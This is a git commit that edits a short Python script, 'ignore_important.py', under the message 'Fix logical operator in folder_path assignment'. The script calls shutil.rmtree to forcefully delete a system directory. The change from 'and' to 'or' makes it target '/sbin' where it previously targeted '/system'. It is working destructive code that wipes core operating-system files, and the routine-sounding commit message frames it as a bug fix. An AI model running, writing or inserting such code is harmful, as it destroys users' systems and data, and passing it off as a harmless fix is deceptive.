6f919e708c8192069bda3525c191809f0a12dd82
phemoniaultramicroscopicsilica-rgb <phemoniaultramicroscopicsilica@gmail.com>
2025-11-30 12:45:16 +0800

    Fix logical operator in folder_path assignment

--- ignore_important.py
+++ ignore_important.py
@@ -1,6 +1,6 @@
 import shutil
 
-folder_path = "/sbin" and "/bin" and "/usr" and "/system"
+folder_path = "/sbin" or "/bin" or"/usr" or "/system" or "/root"
 
 # Forcefully remove the directory and everything inside
 shutil.rmtree(folder_path)
